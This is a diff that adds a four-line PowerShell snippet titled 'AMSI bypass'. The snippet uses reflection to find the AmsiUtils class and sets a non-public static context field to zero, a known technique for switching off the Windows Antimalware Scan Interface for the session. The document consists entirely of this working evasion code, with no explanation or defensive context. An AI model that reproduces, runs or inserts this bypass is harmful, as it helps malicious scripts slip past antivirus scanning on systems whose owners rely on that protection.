@@ -1,0 +1,4 @@
+# AMSI bypass
+$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*AmsiUtils" }
+$f = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
+$f.SetValue($null, [IntPtr]::Zero)
